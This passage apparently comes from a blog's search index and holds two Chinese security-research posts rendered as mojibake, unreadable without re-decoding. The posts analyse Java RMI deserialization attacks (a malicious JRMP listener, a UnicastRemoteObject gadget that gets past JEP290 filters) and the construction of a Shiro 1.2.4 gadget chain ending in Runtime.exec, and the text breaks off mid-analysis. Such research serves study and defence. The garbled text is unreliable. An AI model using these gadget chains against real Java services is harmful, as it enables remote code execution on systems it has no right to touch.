çœ‹ä¸€ä¸‹JRMPListenerçš„ä»£ç ï¼Œç®€å•æ¥è¯´ï¼Œå…¶å®ç°äº†ä¸RMI Clientçš„äº¤äº’æµç¨‹ã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹é‡ç‚¹çš„ä»£ç  åœ¨å®Œæˆå‰é¢çš„ä¸€äº›äº¤äº’æ­¥éª¤åï¼ŒListenerä¼šå‘Clientå‘é€ä¸€ä¸ªExceptionalReturnçš„çŠ¶æ€ï¼Œå¹¶å°†åºåˆ—åŒ–çš„payloadå¡«å……åˆ°BadAttributeValueExpExceptionçš„valå±æ€§ã€‚è¿™é‡Œç”¨çš„BadAttributeValueExpExceptionå¹¶ä¸æ˜¯æˆ‘ä»¬ä»¥å‰åˆ†ææ—¶åšçš„toStringè§¦å‘ç‚¹ï¼Œè€Œæ˜¯ä»…ä½œä¸ºpayloadçš„ä¸€ä¸ªè½½ä½“ï¼Œåœ¨ååºåˆ—åŒ–BadAttributeValueExpExceptionçš„valå±æ€§æ—¶åŒæ ·ååºåˆ—åŒ–äº†æˆ‘ä»¬çš„payloadã€‚ è€Œä½äºClientåœ¨æ¥æ”¶åˆ°ExceptionalReturnæ—¶çš„å¤„ç†æ–¹å¼è§sun/rmi/transport/StreamRemoteCall.java#executeCallå‰é¢çš„åˆ†æéƒ½çœç•¥äº† åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº†ç†Ÿæ‚‰çš„readObjectå‡½æ•°ï¼Œå…¶ç”¨äºå°†å‰é¢çš„Exceptionè¿›è¡Œååºåˆ—åŒ–ã€‚ åˆ°è¿™é‡Œå°±å¯ä»¥ä¸²èµ·æ¥äº†ï¼ŒClientå‘èµ·RMIè¿æ¥ï¼Œè¿æ¥åˆ°æˆ‘ä»¬çš„æ¶æ„Listenerä¸Šé¢ã€‚è€Œæˆ‘ä»¬çš„Listenerå°†è¿”å›ä¸€ä¸ªæ„é€ å¥½çš„Exceptionï¼Œæ—¨åœ¨Clientæ¥æ”¶åˆ°ExceptionalReturnçš„ä¿¡å·æ—¶è¿›è¡Œè¿˜åŸï¼Œä»è€Œé€ æˆäº†RMI Clientç«¯ä¹Ÿå—åˆ°ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»ã€‚ 0x06 æ€»ç»“å‰æ–‡ä¸»è¦è®²è¯‰äº†RMIçš„ç›¸å…³ååºåˆ—åŒ–é—®é¢˜ï¼ŒåŒ…æ‹¬RMI Registryå’ŒRMI Clientæ¥æ”¶åˆ°ååºåˆ—åŒ–æ•°æ®æ—¶äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ã€‚ å…¨æ–‡æ‰€ä½¿ç”¨çš„JDKç‰ˆæœ¬ä¸ºJDK8ï¼Œåœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‘ç°åœ¨æœ€è¿‘çš„JDK8uç‰ˆæœ¬ä¸Šï¼Œå·²æ— æ³•å¯¹RMI Registryå‘èµ·æ”»å‡»ï¼Œä½†å…¶åœ¨JDK8u232_b09ä¹‹å‰çš„ç‰ˆæœ¬è¿˜æ˜¯å¯ä»¥çš„ã€‚ æœ¬æ–‡ä¸»è¦æ”»å‡»çš„æ˜¯RMI Registryï¼Œè€ŒRMIçš„æ”»å‡»é¢ä¸å•å•æ–‡ä¸­æåˆ°çš„è¿™ç§æ–¹å¼ï¼Œè¿˜å­˜åœ¨ é’ˆå¯¹codebaseçš„æ”»å‡»è§https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.mdï¼ŒåŠ è½½æˆ‘ä»¬æ„é€ å¥½çš„classã€‚å½“ç„¶ç°åœ¨è¿™ç§æƒ…å†µæ¯”è¾ƒå°‘äº†ã€‚ é’ˆå¯¹ç»‘å®šçš„å±é™©objçš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡listæ‰€æœ‰ç»‘å®šçš„objï¼ŒæŸ¥æ‰¾å±é™©çš„ç»‘å®šåœ°å€è¿›è¡Œæ”»å‡»ã€‚è¿™é‡Œçš„å±é™©æ€ä¹ˆå®šä¹‰å‘¢ï¼Ÿç¬¬ä¸€æ˜¯ç»‘å®šçš„å¯¹è±¡ç¡®å®å­˜åœ¨æ“ä½œç³»ç»Ÿå‘½ä»¤ç­‰ï¼›ç¬¬äºŒæ˜¯è¯¥å¯¹è±¡çš„ç±»å‡½æ•°å‚æ•°ä¸­å­˜åœ¨ååºåˆ—åŒ–ç‚¹ï¼Œæ¯”å¦‚hello(HashTable xxx)ï¼Œå…¶ä¸­çš„HashTableæ˜¯CommonsCollections7çš„è§¦å‘ç‚¹ï¼Œåœ¨ä¼ é€’è¿‡ç¨‹ä¸­ï¼Œxxxä¼šè¢«åºåˆ—åŒ–ï¼Œåˆ°äº†RMI Serveræ—¶ä¼šååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ‰§è¡Œäº†æˆ‘ä»¬çš„payloadã€‚æœ€åï¼Œè¿™é‡Œæš‚æ—¶è¿˜æ²¡æ‰¾åˆ°æ¡ˆä¾‹â€¦ 0x07 20200303æ›´æ–° UnicastRemoteObject Gadgetè¿™ä¸ªGadgetçš„æ¥æºæ˜¯https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/ ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªGadgetå¯ä»¥åšåˆ°è·ŸJRMPClientä¸€æ ·çš„æ•ˆæœï¼Œä½†æ˜¯æ— æ³•è·Ÿä¸Šé¢çš„Level2ä¸€æ ·ç»•è¿‡é™åˆ¶ï¼ŒåŸå› çœ‹ä¸‹é¢ æœ¬åœ°åœ¨bindæˆ–rebindä¸€ä¸ªRemoteå¯¹è±¡æ—¶ï¼Œä¼šåœ¨sun/rmi/server/MarshalOutputStream.java#replaceObjectè¿›è¡Œè½¬åŒ– åŸæ¥çš„å¯¹è±¡ä¼šè¢«è½¬åŒ–æˆä¸Šé¢çš„ä¸€ä¸ªç»“æ„ï¼Œè¿™é‡Œç›´æ¥ä¸¢æ‰äº†UnicastRemoteObjectï¼Œè‡ªç„¶åœ¨Registryç«¯æ— æ³•ä»UnicastRemoteObjectçš„readObjectå‡½æ•°å¼€å§‹ï¼Œè¿™æ ·è¿™ä¸ªGadgetå°±æ— æ³•æˆåŠŸåˆ©ç”¨äº†ã€‚ è¦æƒ³åˆ©ç”¨è¿™ä¸ªé“¾æ¥ç»•è¿‡é™åˆ¶ï¼Œæˆ‘ä»¬å¯èƒ½å¾—è‡ªå·±å†™ä¸€ä¸ªbindçš„è¿‡ç¨‹æ‰å¯ä»¥ï¼ŒæŠŠgetTargetçš„è¿‡ç¨‹å»æ‰ç›´æ¥å‘è¿‡å»ã€‚è¿™ä¸ªGadgetåˆ©ç”¨ä»·å€¼æ¯”è¾ƒä½XD psï¼šè²Œä¼¼å¯ä»¥é€šè¿‡é‡å†™çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿™é‡Œæœ‰ç©ºå†åˆ†æXD 20200617 æ›´æ–°UnicastRemoteObject Gadgetå‰é¢åœ¨åšåˆ†ææ—¶ï¼Œå‘ç°åœ¨ä½¿ç”¨è¿™ä¸ªåˆ©ç”¨é“¾çš„æ—¶å€™ï¼Œåœ¨å‘è¿‡å»ä¹‹å‰å°±ä¼šè¢«æ›¿æ¢UnicastRefçš„é—®é¢˜ï¼Œå¯¼è‡´æˆ‘ä»¬å‘åˆ°Registryåæ— æ³•è¿˜åŸå‡ºæ­£ç¡®çš„jrmpï¼Œä»Šå¤©æ¥çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆæ›¿æ¢çš„ java.io.ObjectOutputStream#writeObject0#1143 12345678if (enableReplace) &#123; Object rep = replaceObject(obj); if (rep != obj &amp;&amp; rep != null) &#123; cl = rep.getClass(); desc = ObjectStreamClass.lookup(cl, true); &#125; obj = rep;&#125; ä»call.getOutputStream()è·å–åˆ°çš„outputstreamåœ¨å†™å…¥å…·ä½“çš„objectæ—¶ï¼Œåç»­ä¼šæ‰§è¡Œåˆ°å‰é¢çš„ä»£ç ä¸Šï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦enableReplaceï¼ˆé»˜è®¤æ˜¯trueï¼‰ï¼Œæ‰€ä»¥ä¼šé»˜è®¤èµ°åˆ°æˆ‘åœ¨3æœˆä»½æ—¶åˆ†æçš„åœ°æ–¹ï¼ŒæŠŠæˆ‘ä»¬æƒ³è¦çš„jrmpè¿æ¥ç»™æ›¿æ¢æ‰äº†ã€‚ æ‰€ä»¥è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ¡ˆå°±æ˜¯å°†è¿™ä¸ªenableReplaceç»™ç½®ä¸ºfalseï¼Œè¿™é‡Œå®ç°èµ·æ¥å°±æ¯”è¾ƒç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹outputstreamåšåå°„è°ƒç”¨ï¼Œæ›¿æ¢trueä¸ºfalseï¼Œå…·ä½“å®ç°è§L34 è¿™é‡Œéœ€è¦æä¸€ç‚¹çš„æ˜¯è¿™æ¡é“¾å·§å¦™ä¹‹å¤„åœ¨äº UnicastRemoteObjectåˆ©ç”¨é“¾ç”¨åˆ°çš„å¯¹è±¡éƒ½æ˜¯åœ¨Registryå¯ååºåˆ—åŒ–çš„ç™½åå•é‡Œçš„ è·Ÿå‰é¢å‡ ä¸ªå°è£…unicastrefçš„æ€è·¯ä¸åŒï¼ŒUnicastRemoteObjectå®é™…ä¸Šæ˜¯ä¸»åŠ¨å‘å¤–å‘å‡ºjrmpè¿æ¥çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯å‰é¢é€šè¿‡incomingtableè¡¨çš„æ–¹å¼å»è§¦å‘jrmpè¿æ¥ ä¸ºä»€ä¹ˆè¯´ä»–å·§å¦™å‘¢ï¼Ÿåœ¨&gt;=8u232_b09ç‰ˆæœ¬å­˜åœ¨ä¸¤ä¸ªé™åˆ¶ï¼ˆå…·ä½“è§0x04ï¼‰ æ¶ˆé™¤äº†å°è£…unicastRefçš„å¨èƒ åœ¨DGCå±‚æ·»åŠ äº†ç™½åå•çš„æ–¹å¼ï¼Œå¯¼è‡´å°±ç®—jrmpèƒ½åé“¾ä¹Ÿä¸èƒ½ååºåˆ—åŒ–å‡ºç™½åå•ä¹‹å¤–çš„ç±» è€ŒUnicastRemoteObjectç»•è¿‡äº†ä¸Šé¢çš„ä¸¤ä¸ªé™åˆ¶ é¦–å…ˆå¯¹äºç¬¬ä¸€ä¸ªé™åˆ¶ï¼ŒUnicastRemoteObjectçš„jrmpåè¿å‘ç”Ÿåœ¨readObjectè¿‡ç¨‹ä¸­ å…¶æ¬¡å¯¹äºç¬¬äºŒä¸ªé™åˆ¶ï¼Œå‰é¢æåˆ°Registryèƒ½è§¦å‘JRMPåè¿ä¸»è¦æ˜¯å› ä¸ºè°ƒç”¨äº†DGCClient.registerRefså»å¤„ç† è€Œè¿‡è¿™ä¸ªç‚¹å°±éœ€è¦å—åˆ°å‰é¢æåˆ°çš„DGCç™½åå•çš„é—®é¢˜ã€‚æ€ä¹ˆç»•è¿‡è¿™ä¸ªåœ°æ–¹ï¼Ÿç®€å•çš„å°±æ˜¯æ‰¾ä¸€ä¸ªä¸ç»è¿‡DGCClientæ¥è§¦å‘å³å¯ã€‚ å‰é¢åˆ†æ&lt;8u232_b09æ—¶ï¼Œç”¨åˆ°çš„RemoteObjectInvocationHandlerçš„æ–¹å¼æ¥è§¦å‘ï¼Œä¸è¿‡è¿™é‡Œå…¶å®åªç”¨åˆ°äº†å°è£…UnicastRefçš„ä½œç”¨ï¼ˆè¿™é‡Œæä¸€ä¸‹å®é™…è§¦å‘æ—¶éœ€è¦è°ƒç”¨UnicastRef.invokeï¼‰ã€‚UnicastRemoteObjectå¯¹è¿™ä¸ªhandleråšäº†æ›´æ·±å…¥çš„åˆ©ç”¨ï¼Œè¿™é‡Œç”¨åˆ°äº†java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod è°ƒç”¨äº†ref.invokeè§¦å‘jrmpåè¿ï¼Œåˆ°è¿™é‡Œéƒ½æ²¡æœ‰ç»è¿‡DGCClientçš„è·¯å¾„ï¼Œè‡ªç„¶ä¹Ÿå°±æ²¡æœ‰ç™½åå•çš„é™åˆ¶ã€‚ ä¸è¿‡è¿™æ¡é“¾åˆ°äº†8u242ä¹Ÿå¤±æ•ˆäº†ï¼Œä¸»è¦åŸå› åœ¨äºlookupæ¥å£æ— æ³•å†ååºåˆ—åŒ–éstringç±»å‹çš„objectäº† 0x08 RMI DGCå®ç°é—®é¢˜(ysoserial.expliots.JRMPClient)åœ¨JEP290ä¹‹å‰ï¼ŒRMIçš„DGCImpl_skel#dipatchæ¥æ”¶å¤„ï¼Œè·å–åˆ°æ•°æ®åï¼Œç›´æ¥readObjecté€ æˆçš„ã€‚ åœ¨JEP290ä¹‹åï¼Œååºåˆ—åŒ–å‰åšäº†æ ¡éªŒï¼Œè§DGCImpl å¯¼è‡´äº†ysoserialçš„exploitä¸­çš„JRMPClientå¤±æ•ˆ 0x09 æ€»ç»“ä¸­ç¬¬äºŒç§æ–¹å¼çš„è§¦å‘ç‚¹ï¼ˆ20200317 æ›´æ–°ï¼‰å‰é¢æ€»ç»“ä¸­æåˆ°çš„ç¬¬äºŒä¸­æ–¹å¼ï¼šé€šè¿‡å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç»‘å®šå¯¹è±¡çš„å‡½æ•°çš„å‚æ•°è¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨ ç›´æ¥è®²è§¦å‘ç‚¹sun/rmi/server/UnicastServerRef.java#dispatch#338 å½“æˆ‘ä»¬ç¼–å†™Clientç«¯å¯¹Serverç«¯æŒ‚è½½çš„å¯¹è±¡è¿›è¡Œè¿œç¨‹å‡½æ•°è°ƒç”¨ï¼ˆRMIï¼‰æ—¶ï¼ŒServerç«¯ä¼šé€ä¸€è¿›è¡Œï¼ˆè·å–åˆ°Methtodï¼Œè§£æparametersï¼Œæœ€åè¿›è¡Œinvokeè°ƒç”¨ï¼‰ã€‚è€Œåœ¨è§£æparamsæ—¶ï¼ˆæˆ‘ä»¬è®²è¿‡RMIè¿‡ç¨‹ä¸­ï¼Œå¯¹è±¡å‡æ˜¯åºåˆ—åŒ–çš„çŠ¶æ€ï¼‰æˆ‘ä»¬éœ€è¦å…ˆå¯¹å‚æ•°å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯ç¬¬338è¡Œæ‰€åšçš„å·¥ä½œï¼Œç»§ç»­å¾€ä¸‹è·Ÿ åœ¨å‡½æ•°unmarshalParametersUncheckedä¸­åˆ†åˆ«å¯¹æ¯ä¸ªå‚æ•°è¿›è¡Œååºåˆ—åŒ–è¿˜åŸ å¦‚æœæ‰€æ¥å—çš„ç±»å‹éåŸºç¡€æ•°æ®ç»“æ„ï¼Œé‚£ä¹ˆå°†ç›´æ¥è°ƒç”¨readObjectï¼Œè¿™éƒ¨åˆ†å¹¶æ²¡æœ‰å‰é¢filterçš„é™åˆ¶ æ‰€ä»¥å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªServerç«¯æŒ‚è½½çš„å¯¹è±¡å­˜åœ¨å‡½æ•°å‚æ•°ç±»å‹ä¸ºObjectã€HashTableç­‰ç±»å‹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç©¿å…¥æ„é€ å¥½çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚å½“å‰å‰æè¿˜æ˜¯Serverç«¯çš„ç¯å¢ƒä¸­å­˜åœ¨ç›¸åº”çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„ä¾èµ–ã€‚"},{"title":"Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹Shiroååºåˆ—åŒ–","permalink":"http://blog.0kami.cn/2019/11/10/java/study-java-deserialized-shiro-1-2-4/","text":"0x00 å‰è¨€åœ¨è·Ÿäº†ä¸€écommons-collectionsç³»åˆ—çš„payloadåï¼Œç»ˆäºå¯ä»¥å¼€å§‹è§£å†³ä¸€ä¸‹å½“æ—¶å¯¹shiroååºåˆ—åŒ–æ¨¡å‡Œä¸¤å¯çš„è®¤è¯†äº†ã€‚ å½“å‰ï¼Œä¸ç®¡æ˜¯å›½å†…å®é™…çš„xxè¡ŒåŠ¨è¿˜æ˜¯ctfæ¯”èµ›ï¼Œshiroååºåˆ—åŒ–ä¼šç»å¸¸çœ‹åˆ°ã€‚ä½†åœ¨å®é™…åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„æ—¶å€™ï¼Œä¼šå‘ç°æˆ‘ä»¬æ— æ³•åœ¨tomcatä¸‹ç›´æ¥åˆ©ç”¨shiro-sampleä¸­çš„commons-collections:3.2.1ï¼ˆ2021-03-16æ›´æ–°ï¼Œè¿™é‡Œç»pç‰›æŒ‡æ­£ï¼Œshiroå¹¶æ²¡æœ‰ä¾èµ–ccåº“ï¼Œè¯¦æƒ…ï¼‰ã€‚ æˆ‘ä»¬å‰é¢å·²ç»å¯¹commons-collectionsç³»åˆ—åˆ©ç”¨é“¾çš„åˆ†æï¼Œä»Šå¤©å°±æ¥æ ¹æ®å­¦åˆ°çš„çŸ¥è¯†æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æœ¬æ–‡è®¨è®ºäº†shiro-1.2.4ç‰ˆæœ¬æ— æ³•ç›´æ¥åˆ©ç”¨ç°æœ‰çš„ysoserialåˆ©ç”¨é“¾ï¼Œå¹¶æå‡ºäº†ç›¸åº”çš„è§£å†³æ–¹æ¡ˆã€‚ 0x01 ç¯å¢ƒå‡†å¤‡è¿™é‡Œç”¨çš„æ˜¯shiro-root-1.2.4çš„samples/webç¯å¢ƒï¼Œcloneä¸‹æ¥åæ‰§è¡Œgit checkout shiro-root-1.2.4 åˆ©ç”¨è„šæœ¬å‚è€ƒçš„çŸ¥é“åˆ›å®‡çš„ä¸€ç¯‡åˆ†æ ysoserialç”¨çš„0.0.6ç‰ˆæœ¬https://github.com/frohoff/ysoserial å…ˆæ¥è®²ä¸€ä¸‹ï¼Œå…³äºç¯å¢ƒæ–¹é¢é‡åˆ°çš„å‘ï¼š åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this applicationçš„é”™è¯¯ è¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯ä¿®æ”¹pom.xml â€‹ æ·»åŠ jstlçš„å…·ä½“ç‰ˆæœ¬å³å¯è§£å†³ã€‚ serialVersionUIDä¸ä¸€è‡´å¯¼è‡´æ— æ³•ååºåˆ—åŒ–çš„é—®é¢˜ è¿™é‡Œå¯èƒ½åœ¨ä½ çš„å®éªŒç¯å¢ƒä¸‹ä¸ä¸€å®šä¼šé‡åˆ°ï¼Œæˆ‘çš„å®éªŒç¯å¢ƒå’Œysoserialç”Ÿæˆçš„æŸå‡ ä¸ªç±»çš„serialVersionUIDä¸ä¸€è‡´ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸ååºåˆ—åŒ–ã€‚åœ¨å®æˆ˜ä¸­ä½ å¯ä»¥é‡‡ç”¨è¿™ç¯‡æ–‡ç« å¤„ç†æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯ç›´æ¥åŒæ­¥ä¸ªcommons-collections:3.2.1ç‰ˆæœ¬ï¼Œåœ¨ç”ŸæˆwaråŒ…å‰ï¼Œåœ¨pom.xmlåŠ å…¥ 123456&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 0x02 å‰æ™¯å›é¡¾16å¹´çš„æ—¶å€™ï¼Œshiroçˆ†å‡ºäº†ä¸€ä¸ªé»˜è®¤keyçš„ååºåˆ—åŒ–æ¼æ´ã€‚è‡³ä»Šå·²æœ‰å¤§é‡çš„åˆ†ææ–‡ç« åˆ†æäº†è¯¥æ¼æ´çš„åŸç†ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸å†é‡å¤åˆ†æè¯¥æ¼æ´çš„ç›¸å…³åŸç†ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç¯‡æ–‡ç« çš„åˆ†æï¼š 1.https://blog.knownsec.com/2016/08/apache-shiro-java/ 2.https://blog.zsxsoft.com/post/35 3.http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html é™¤äº†1ä¸­åœ¨æ¼æ´ç¯å¢ƒä¸‹æ·»åŠ äº†commons-collections:4.0ï¼Œå¦å¤–ä¸¤ç¯‡æ–‡ç« å‡æåˆ°äº†åœ¨tomcatä¸‹æ— æ³•ç›´æ¥åˆ©ç”¨commons-collections:3.2.1çš„é—®é¢˜ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆåŸå› å§ï¼šï¼‰ org.apache.shiro.io.DefaultSerializer.deserialize:67 è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹ååºåˆ—åŒ–å‘ç”Ÿçš„ç‚¹ï¼Œç¬¬75è¡Œä½¿ç”¨äº†ClassResolvingObjectInputStreamç±»è€Œéä¼ ç»Ÿçš„ObjectInputStream.è¿™é‡Œå¯èƒ½æ˜¯å¼€å‘äººå‘˜åšçš„ä¸€ç§é˜²æŠ¤æªæ–½ï¼Ÿä»–é‡å†™äº†ObjectInputStreamç±»çš„resolveClasså‡½æ•°ï¼Œæˆ‘æ›¾åœ¨ç¬¬ä¸€ç¯‡åŸºç¡€æ–‡ç« ä¸­åˆ†æè¿‡Javaååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ŒObjectInputStreamçš„resolveClasså‡½æ•°ç”¨çš„æ˜¯Class.forNameç±»è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ã€‚è€Œé‡å†™åçš„resolveClasså‡½æ•° é‡‡ç”¨çš„æ˜¯ClassUtils.forNameï¼Œæˆ‘ä»¬ç»§ç»­çœ‹è¿™ä¸ªforNameçš„å®ç°ã€‚ æ¥çœ‹çœ‹è¿™ä¸ªExceptionIgnoringAccessoræ˜¯æ€ä¹ˆå®ç°çš„ è¿™é‡Œå®é™…ä¸Šè°ƒç”¨äº†ParallelWebAppClassLoaderçˆ¶ç±»WebappClassLoaderBaseçš„loadClasså‡½æ•°ï¼ˆå¯ä»¥ç›´æ¥ä¸‹æ–­ç‚¹çœ‹çœ‹å†…å®¹ï¼‰ã€‚ è¯¥loadClassè½½å…¥æŒ‰ç…§ä¸Šè¿°çš„é¡ºåºï¼ˆè¿™é‡Œä¸è´´ä»£ç äº†ï¼Œæ‰¾åˆ°org.apache.catalina.loader.WebappClassLoaderBase.loadClasså³å¯ï¼‰ï¼Œå…ˆä»cacheä¸­æ‰¾å·²è½½å…¥çš„ç±»ï¼Œå¦‚æœå‰3ç‚¹éƒ½æ²¡æ‰¾åˆ°ï¼Œå†é€šè¿‡çˆ¶ç±»URLClassLoaderçš„loadClasså‡½æ•°è½½å…¥ã€‚ä½†æ˜¯å®é™…ä¸Šæ­¤æ—¶loadClassçš„å‚æ•°nameå€¼å¸¦ä¸Šäº†æ•°ç»„çš„æ ‡å¿—ï¼Œå³/Lorg/apache/commons/collections/Transformer;.classï¼Œåœ¨å‚è€ƒçš„ç¬¬äºŒç¯‡æ–‡ç« é‡Œæœ‰æåˆ°è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥å¯¼è‡´shiroæ— æ³•è½½å…¥æ•°ç»„ç±»å‹çš„å¯¹è±¡ã€‚ é‚£ä¹ˆå¦‚ä½•æ‰èƒ½çœŸæ­£çš„åˆ©ç”¨commons-collections:3.2.1æ¥æ„é€ åˆ©ç”¨é“¾å‘¢ï¼Ÿ é¦–å…ˆï¼Œåœ¨å‚è€ƒçš„ç¬¬ä¸€ç¯‡æ–‡ç« é‡Œï¼Œä½œè€…åœ¨ç¯å¢ƒä¸­å¼•å…¥äº†commons-collections:4.0ï¼Œä½¿å¾—ysoserialçš„CommonsCollections2åˆ©ç”¨é“¾å¯ä»¥æˆåŠŸåˆ©ç”¨ã€‚è¿™æ˜¯å› ä¸ºCommonsCollections2ç”¨çš„æ˜¯éæ•°ç»„å½¢å¼çš„åˆ©ç”¨é“¾ï¼Œåœ¨è¯¥åˆ©ç”¨é“¾ä¸Šæ²¡æœ‰å‡ºç°æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼Œè¿™ä½¿å¾—åœ¨shiroçš„ç¯å¢ƒä¸‹ï¼Œå¯ä»¥æ­£ç¡®æ‰§è¡Œå‘½ä»¤ã€‚ é‚£ä¹ˆï¼Œé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ„é€ å‡ºä¸€ä¸ªåœ¨commons-collections:3.2.1ä¸‹å¯ä»¥åˆ©ç”¨ï¼Œå¹¶ä¸”åœ¨åˆ©ç”¨é“¾ä¸Šä¸å­˜åœ¨æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼šï¼‰ 0x03 æ–°åˆ©ç”¨é“¾æ„é€ æ ¹æ®0x02çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„æ˜¯åˆ©ç”¨é“¾ä¸­çš„ChainedTransformerè¿™ä¸ªç±»çš„åˆ©ç”¨æ˜¯æ— æ³•æˆåŠŸçš„ï¼Œå› ä¸ºä»–çš„ç±»å±æ€§iTransformersæ˜¯æ•°ç»„ç±»å‹çš„Transformersï¼Œä¹Ÿå°±æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿçš„ClassNotFoundExceptionã€‚ å¦‚æœä½ çœ‹è¿‡å‰å‡ ç¯‡å…³äºcommons-collectionsç³»åˆ—çš„payloadåˆ†æï¼Œé‚£ä¹ˆä½ è‚¯å®šå¯ä»¥å›å¿†èµ·æ¥ï¼Œé™¤äº†åˆ©ç”¨ChainedTransformerè¿™ç§æ–¹å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨TemplatesImpl.newTransformerå‡½æ•°æ¥åŠ¨æ€loadClassæ„é€ å¥½çš„evil class bytesï¼ˆè¿™ä¸€éƒ¨åˆ†ä¸å¤è¿°äº†ï¼Œå¯ä»¥çœ‹å‰é¢çš„æ–‡ç« ï¼‰ã€‚å¹¶ä¸”åœ¨è¿™éƒ¨åˆ†åˆ©ç”¨é“¾ä¸Šæ˜¯ä¸å­˜åœ¨æ•°ç»„ç±»å‹çš„å¯¹è±¡çš„ã€‚ é‚£ä¹ˆï¼Œæ¥ä¸‹æ¥çš„é‡ç‚¹å°±æ˜¯æ‰¾ä¸€ä¸ªå¦‚ä½•è§¦å‘TemplatesImpl.newTransformerçš„æ–¹æ³•äº†ï¼šï¼‰ æˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹CommonsCollections2çš„åˆ©ç”¨é“¾ 123456789PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() åœ¨è¿™æ¡é“¾ä¸Šï¼Œç”±äºTransformingComparatoråœ¨3.2.1çš„ç‰ˆæœ¬ä¸Šè¿˜æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œå…¶åœ¨3.2.1ç‰ˆæœ¬ä¸‹æ˜¯æ— æ³•ååºåˆ—åŒ–çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ©ç”¨è¯¥payloadæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚ é‚£ä¹ˆå°±æ¥æ”¹é€ æ”¹é€ å§ï¼æˆ‘ä»¬å…ˆå°†æ³¨æ„åŠ›å…³æ³¨åœ¨InvokerTransformer.transform()ä¸Š è¿™é‡Œæ˜¯æœ€ç»å…¸çš„åå°„æœºåˆ¶çš„å†™æ³•ï¼Œæ ¹æ®ä¼ å…¥çš„inputå¯¹è±¡ï¼Œè°ƒç”¨å…¶iMethodNameï¼ˆå¯æ§ï¼‰ã€‚é‚£ä¹ˆå¦‚æœæ­¤æ—¶ä¼ å…¥çš„inputä¸ºæ„é€ å¥½çš„TemplatesImplå¯¹è±¡å‘¢ï¼Ÿ å¾ˆæ˜æ˜¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å°†iMethodNameç½®ä¸ºnewTransformerï¼Œä»è€Œå®Œæˆåç»­çš„templates gadgetsã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆå°†ä¼ å…¥çš„inputç½®ä¸ºTemplatesImplå¯¹è±¡å‘¢ï¼Ÿ åœ¨ysoserialçš„åˆ©ç”¨é“¾ä¸­ï¼Œå…³äºtransformå‡½æ•°æ¥æ”¶çš„inputå­˜åœ¨ä¸¤ç§æƒ…å†µã€‚ 1.é…åˆChainedTransformerInvokerTransformerå¾€å¾€åŒChainedTransformeré…åˆï¼Œå¾ªç¯æ„é€ 